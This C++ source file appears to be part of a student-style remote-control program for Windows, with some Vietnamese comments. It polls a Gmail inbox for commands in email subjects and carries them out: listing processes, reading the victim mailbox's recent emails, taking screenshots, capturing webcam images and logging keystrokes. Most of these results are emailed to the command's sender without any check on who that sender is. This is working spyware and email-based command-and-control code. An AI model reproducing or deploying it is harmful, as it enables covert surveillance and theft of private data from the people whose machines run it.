#include "..\Server\ServerManager.h"
#include "..\Functions\RunningApps.h"
#include "..\Functions\WebcamCapture.h"
#include "..\Functions\KeyboardTracker.h"
#include "..\Functions\ScreenshotHandler.h"

ServerManager::ServerManager(GmailAPI& api)
    : gmail(api), monitor(api, config, *this), running(false) {
    // Initialize config
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    struct addrinfo hints = {}, * addrs;
    hints.ai_family = AF_INET;
    if (getaddrinfo(hostname, NULL, &hints, &addrs) == 0) {
        char ip[INET_ADDRSTRLEN];
        sockaddr_in* sockaddr_ipv4 = (sockaddr_in*)addrs->ai_addr;
        inet_ntop(AF_INET, &sockaddr_ipv4->sin_addr, ip, INET_ADDRSTRLEN);
        config.serverIP = ip;
        freeaddrinfo(addrs);
    }
    config.checkInterval = 10000; // 10 seconds
    config.logFile = "server.log";
}


void ServerManager::start() {
    running = true;
    logActivity("Server started");
    while (running) {
        processCommands();
        Sleep(config.checkInterval);
    }
}

void ServerManager::stop() {
    running = false;
    logActivity("Server stopped");
}

void ServerManager::processCommands() {
    if (monitor.checkForCommands()) {
        logActivity("Processing commands");
    }
}

void ServerManager::logActivity(const string& activity) {
    ofstream log(config.logFile, ios::app);
    time_t now = time(nullptr);
    char timeStr[26];
    ctime_s(timeStr, sizeof(timeStr), &now);
    log << timeStr << ": " << activity << endl;
}

void ServerManager::handleCommand(const Json::Value& command) {
    Json::Value response;
    response["type"] = "response";

    // Kiểm tra Subject
    string subject = command["Subject"].asString();
    if (subject.find("Command") != string::npos) {
        // Xử lý lệnh
        string commandStr = subject.substr(subject.find("Command") + 9);
        if (commandStr == "listProcess") {
            handleProcessListCommand(command);
            return; // Thêm return để tránh gửi email phản hồi
        }
        else if (commandStr == "readRecentEmails") {
            handleReadRecentEmailsCommand(command);
            return; // Thêm return để tránh gửi email phản hồi
        }
        else if (commandStr == "captureScreen") {
            handleCaptureScreen(command);
            return;
            // Handle screenshot command
        }
        else if (commandStr == "captureWebcam") {
            handleCaptureWebcam(command);
            return;
        }
        else if (commandStr == "trackKeyboard") {
            handleTrackKeyboard(command);
            return;
        }
        else if (commandStr == "sysinfo") {
            // Handle system info command
        }
        else if (commandStr == "shutdown") {
            // Handle shutdown command
        }
        else {
            // Handle unknown command
            response["message"] = "Unknown command";
        }
    }
    else {
        response["message"] = "Invalid command format";
    }
}

void ServerManager::handleProcessListCommand(const Json::Value& command) {
    cout << "Handling process list command..." << endl;
    // Get the sender's email address
    string senderEmail = command["From"].asString();
    cout << "Sender email: " << senderEmail << endl;

    // Get process list
    vector<ProcessInfo> processes = RunningApps::getRunningApps();

    // Ghi process list vào file
    string filename = "D:\\process_list_" + to_string(time(nullptr)) + ".txt";
    ofstream file(filename);
    for (const auto& process : processes) {
        file << "Process Name: " << process.name << endl;
        file << "Process ID: " << process.processId << endl;
        file << "Memory Usage: " << process.memoryUsage << " bytes" << endl;
        file << endl;
    }
    file.close();
    string subject = "Hello!";
    string body = "Email Content!";

    if (gmail.sendEmail(senderEmail, subject, body, filename)) {
        cout << "Process list sent successfully via email" << endl;
    }
    else {
        cout << "Failed to send process list via email" << endl;
    }
}

void ServerManager::handleReadRecentEmailsCommand(const Json::Value& command) {
    cout << "Handling read recent emails command..." << endl;
    // Get the sender's email address
    string senderEmail = command["From"].asString();

    // Get the recent emails from Gmail API
    vector<string> recentEmails = gmail.getRecentEmails();

    // In recent emails ra màn hình
    for (const auto& email : recentEmails) {
        cout << email << endl << endl;
    }

    // Ghi recent emails vào file
    string filename = "recent_emails_" + to_string(time(nullptr)) + ".txt";
    ofstream file(filename);
    for (const auto& email : recentEmails) {
        file << email << endl << endl;
    }
    file.close();

    string subject = "Hello!";
    string body = "Email Content!";

    if (gmail.sendEmail(senderEmail, subject, body, filename)) {
        cout << "Recent received emails sent successfully via email" << endl;
    }
    else {
        cout << "Failed to send recent received emails via email" << endl;
    }
}

void ServerManager::handleCaptureWebcam(const Json::Value& command) {
    // Tạo đối tượng WebcamCapture
    WebcamCapture webcamCapture;

    // Get the sender's email address
    string senderEmail = command["From"].asString();
    cout << "Sender email: " << senderEmail << endl;

    // Tạo đường dẫn file dựa trên thời gian hiện tại
    string filename = "D:\\webcam_capture_" + to_string(time(nullptr)) + ".jpg";

    // Gọi hàm captureImage
    if (webcamCapture.captureImage(filename.c_str())) {
        cout << "Chụp ảnh từ webcam thành công!" << endl;
    }
    else {
        cout << "Chụp ảnh từ webcam thất bại!" << endl;
    }

    string subject = "Hello!";
    string body = "Email Content!";

    if (gmail.sendEmail(senderEmail, subject, body, filename)) {
        cout << "Webcam capture sent successfully via email" << endl;
    }
    else {
        cout << "Failed to send webcam capture via email" << endl;
    }
}

void ServerManager::handleCaptureScreen(const Json::Value& command) {
	// Create screenshot handler
	ScreenshotHandler screenshotHandler;

    // Get the sender's email address
    string senderEmail = command["From"].asString();
    cout << "Sender email: " << senderEmail << endl;

	// Create filename with timestamp
	time_t now = time(nullptr);
	struct tm timeinfo;
	localtime_s(&timeinfo, &now);
	char timestamp[64];
	strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", &timeinfo);

	std::string filename = "D:\\screenshot_" + std::string(timestamp) + ".jpg";

	// Capture screenshot
	if (screenshotHandler.captureWindow(filename)) {
		std::cout << "Screenshot captured successfully. Saved to: " << filename << std::endl;
	}
	else {
		std::cout << "Failed to capture screenshot" << std::endl;
	}

    string subject = "Hello!";
    string body = "Email Content!";

    if (gmail.sendEmail(senderEmail, subject, body, filename)) {
        cout << "Screen capture sent successfully via email" << endl;
    }
    else {
        cout << "Failed to send screen capture via email" << endl;
    }
}

void ServerManager::handleTrackKeyboard(const Json::Value& command) {
    int duration = command.get("duration", 5).asInt();

    // Create results directory using Windows API
    if (!CreateDirectoryA("results", NULL) &&
        GetLastError() != ERROR_ALREADY_EXISTS) {
        std::cout << "Failed to create results directory" << std::endl;
        return;
    }

    // Create filename with timestamp
    time_t now = time(nullptr);
    struct tm timeinfo;
    localtime_s(&timeinfo, &now);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", &timeinfo);

    std::string filename = "D:\\keyboard_log_" + std::string(timestamp) + ".txt";

    // Create and start keyboard tracker
    KeyboardTracker tracker;
    if (tracker.StartTracking(filename, duration)) {
        MSG msg;
        auto startTime = std::chrono::system_clock::now();

        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);

            auto elapsed = std::chrono::system_clock::now() - startTime;
            if (std::chrono::duration_cast<std::chrono::seconds>(elapsed).count() >= duration) {
                break;
            }
        }

        tracker.StopTracking();
        std::cout << "Keyboard tracking completed. Log saved to: " << filename << std::endl;
    }
}